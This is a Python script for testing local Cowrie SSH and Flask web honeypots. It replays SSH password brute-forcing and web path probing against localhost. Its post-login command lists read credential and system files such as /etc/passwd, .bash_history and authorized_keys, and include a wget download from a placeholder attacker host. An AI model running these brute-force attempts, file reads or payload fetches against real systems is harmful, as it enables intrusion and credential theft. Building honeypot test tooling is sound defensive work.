#!/usr/bin/env python3
"""
simulate_attack.py — Replay attack traffic against a live honeypot container.

SSH attacks  → real paramiko connections to Cowrie (port 2222)
Web attacks  → real HTTP requests to Flask honeypot (port 8080)

Cowrie logs every attempt as cowrie.login.failed / cowrie.login.success.
Flask logs every request to logs/requests.json.

Usage:
  python3 simulate_attack.py --log attack_logs/ssh_001.json --session hp_ssh_001
  python3 simulate_attack.py --log attack_logs/web_001.json --session hp_web_001 --intensity 3

Intensity:
  1 = light  — each target hit once, slow pacing
  2 = medium — 3x per target, 1s between, post-login commands on success
  3 = heavy  — 5x per target, fast pacing, full post-login exploration
"""

import argparse
import json
import re
import socket
import sys
import time
from pathlib import Path

BASE = Path(__file__).parent.resolve()

# ---------------------------------------------------------------------------
# Password lists per intensity
# ---------------------------------------------------------------------------

PASSWORDS = {
    1: ["password", "123456", "{username}123"],
    2: ["password", "123456", "{username}123", "{username}@2024", "letmein"],
    3: ["password", "123456", "{username}123", "{username}@2024", "letmein",
        "admin", "backup123", "qwerty", "iloveyou", "monkey"],
}

# Commands a real attacker would run after SSH login (intensity 2+)
POST_LOGIN_COMMANDS_MEDIUM = [
    "id",
    "uname -a",
    "ls /home",
    "ls /home/admin",
    "cat /etc/passwd",
]

# Commands for intensity 3 — deeper exploration, reads decoy files
POST_LOGIN_COMMANDS_HEAVY = [
    "id",
    "uname -a",
    "whoami",
    "ls -la /home",
    "ls -la /home/admin",
    "cat /home/admin/credentials.txt",
    "ls /var/backups",
    "cat /var/backups/customer_db.sql",
    "ls /opt/scripts",
    "cat /opt/scripts/backup_mysql.sh",
    "find / -name '*.sql' 2>/dev/null",
    "find / -name 'credentials*' 2>/dev/null",
    "cat /home/admin/.bash_history",
    "cat /home/admin/.ssh/authorized_keys",
    "cat /root/deploy.sh",
    "wget http://evil.example.com/payload.sh",
]

DELAY = {1: 2.0, 2: 1.0, 3: 0.3}
REPEATS = {1: 1, 2: 3, 3: 5}


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

def load_log(log_path: Path) -> dict:
    with open(log_path) as f:
        return json.load(f)


def wait_for_port(host: str, port: int, timeout: float = 30.0):
    deadline = time.time() + timeout
    while time.time() < deadline:
        try:
            s = socket.create_connection((host, port), timeout=1)
            s.close()
            return True
        except (ConnectionRefusedError, OSError):
            time.sleep(1)
    return False


def extract_ssh_targets(log: dict) -> list[str]:
    """Pull usernames from log events (Failed password for X, Invalid user X)."""
    usernames = []
    seen = set()
    for event in log.get("events", []):
        m = re.search(r'(?:Failed password for|Invalid user)\s+(\S+)', event)
        if m:
            u = m.group(1)
            if u not in seen:
                seen.add(u)
                usernames.append(u)
        m2 = re.search(r'Accepted password for\s+(\S+)', event)
        if m2:
            u = m2.group(1)
            if u not in seen:
                seen.add(u)
                usernames.append(u)
    return usernames or ["root", "admin", "backup"]


def extract_web_targets(log: dict) -> list[tuple[str, str]]:
    """Pull (method, path) pairs from log events."""
    targets = []
    seen = set()
    for event in log.get("events", []):
        m = re.match(r'(GET|POST|PUT|DELETE|HEAD)\s+(\S+)', event)
        if m:
            method = m.group(1)
            path = m.group(2).split("?")[0].split(" ")[0]
            key = (method, path)
            if key not in seen:
                seen.add(key)
                targets.append(key)
    return targets or [("GET", "/admin"), ("POST", "/login"), ("GET", "/.env")]


# ---------------------------------------------------------------------------
# SSH simulation
# ---------------------------------------------------------------------------

def simulate_ssh(log: dict, session_id: str, intensity: int):
    import paramiko

    port = 2222
    host = "localhost"
    usernames = extract_ssh_targets(log)
    passwords = PASSWORDS[intensity]
    delay = DELAY[intensity]
    repeats = REPEATS[intensity]

    print(f"[sim-ssh] Target: {host}:{port}")
    print(f"[sim-ssh] Usernames: {usernames}")
    print(f"[sim-ssh] Intensity {intensity}: {repeats}x per user, {delay}s delay")
    print(f"[sim-ssh] Waiting for Cowrie to be ready...")

    if not wait_for_port(host, port, timeout=45):
        print(f"[sim-ssh] ERROR: Cowrie not reachable on {host}:{port} after 45s")
        sys.exit(1)

    print(f"[sim-ssh] Cowrie is up. Starting attack simulation.\n")
    time.sleep(1)

    for username in usernames:
        for repeat in range(repeats):
            for pw_template in passwords:
                password = pw_template.replace("{username}", username)
                print(f"[sim-ssh] Attempt: user={username} pass={password}")
                client = paramiko.SSHClient()
                client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                try:
                    client.connect(
                        host, port=port,
                        username=username, password=password,
                        timeout=5, banner_timeout=8,
                        auth_timeout=5, look_for_keys=False,
                        allow_agent=False
                    )
                    print(f"[sim-ssh] LOGIN SUCCESS: {username}:{password}")
                    # Run post-login commands
                    cmds = (POST_LOGIN_COMMANDS_HEAVY if intensity == 3
                            else POST_LOGIN_COMMANDS_MEDIUM)
                    for cmd in cmds:
                        try:
                            print(f"[sim-ssh]   cmd: {cmd}")
                            stdin, stdout, stderr = client.exec_command(cmd, timeout=3)
                            out = stdout.read(512).decode(errors="replace").strip()
                            if out:
                                print(f"[sim-ssh]   out: {out[:80]}")
                            time.sleep(0.5)
                        except Exception:
                            pass
                    client.close()
                    time.sleep(delay)

                except paramiko.AuthenticationException:
                    print(f"[sim-ssh] FAILED: {username}:{password}")
                    time.sleep(delay)
                except Exception as e:
                    print(f"[sim-ssh] ERROR: {username}:{password} — {e}")
                    time.sleep(delay)
                finally:
                    try:
                        client.close()
                    except Exception:
                        pass

    print(f"\n[sim-ssh] Simulation complete.")


# ---------------------------------------------------------------------------
# Web simulation
# ---------------------------------------------------------------------------

def simulate_web(log: dict, session_id: str, intensity: int):
    import requests
    from requests.exceptions import RequestException

    port = 8080
    base_url = f"http://localhost:{port}"
    targets = extract_web_targets(log)
    delay = DELAY[intensity]
    repeats = REPEATS[intensity]

    # Extra probe paths for medium/heavy
    extra_probes = []
    if intensity >= 2:
        extra_probes = [
            ("GET", "/.env"),
            ("GET", "/config.php.bak"),
            ("GET", "/backup/db.sql"),
            ("POST", "/login"),
            ("POST", "/admin"),
        ]
    if intensity >= 3:
        extra_probes += [
            ("GET", "/admin/users"),
            ("GET", "/admin/dashboard"),
            ("GET", "/wp-admin"),
            ("GET", "/phpmyadmin"),
            ("GET", "/.git/config"),
            ("GET", "/backup"),
            ("GET", "/config"),
        ]

    all_targets = targets + [t for t in extra_probes if t not in targets]

    print(f"[sim-web] Target: {base_url}")
    print(f"[sim-web] Paths: {[p for _, p in all_targets]}")
    print(f"[sim-web] Intensity {intensity}: {repeats}x per path, {delay}s delay")
    print(f"[sim-web] Waiting for Flask honeypot to be ready...")

    if not wait_for_port("localhost", port, timeout=30):
        print(f"[sim-web] ERROR: Flask not reachable on port {port} after 30s")
        sys.exit(1)

    print(f"[sim-web] Flask is up. Starting attack simulation.\n")
    time.sleep(1)

    session = requests.Session()
    session.headers["User-Agent"] = "Mozilla/5.0 (compatible; Scanner/1.0)"

    for repeat in range(repeats):
        for method, path in all_targets:
            url = base_url + path
            try:
                if method == "POST":
                    data = {"username": "admin", "password": "admin123"}
                    resp = session.post(url, data=data, timeout=5, allow_redirects=True)
                else:
                    resp = session.get(url, timeout=5, allow_redirects=True)
                print(f"[sim-web] {method} {path} → {resp.status_code} ({len(resp.content)}B)")
                if resp.status_code == 200 and len(resp.content) > 100:
                    print(f"[sim-web]   snippet: {resp.text[:120].strip()}")
            except RequestException as e:
                print(f"[sim-web] ERROR: {method} {path} — {e}")
            time.sleep(delay)

    print(f"\n[sim-web] Simulation complete.")


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------

def main():
    parser = argparse.ArgumentParser(prog="simulate_attack.py")
    parser.add_argument("--log", required=True, help="Path to attack log JSON")
    parser.add_argument("--session", required=True, help="Session ID (must already be deployed)")
    parser.add_argument("--intensity", type=int, default=2, choices=[1, 2, 3],
                        help="1=light, 2=medium, 3=heavy (default: 2)")
    args = parser.parse_args()

    log_path = Path(args.log)
    if not log_path.exists():
        print(f"ERROR: log not found: {log_path}", file=sys.stderr)
        sys.exit(1)

    log = load_log(log_path)
    port = log.get("destination_port", 22)

    if port == 22 or port in (22,):
        simulate_ssh(log, args.session, args.intensity)
    elif port in (80, 443, 8080, 8443):
        simulate_web(log, args.session, args.intensity)
    else:
        print(f"[sim] Port {port} — unknown type. No simulation available for this blueprint.")
        print(f"[sim] monitor_only sessions do not generate traffic.")


if __name__ == "__main__":
    main()
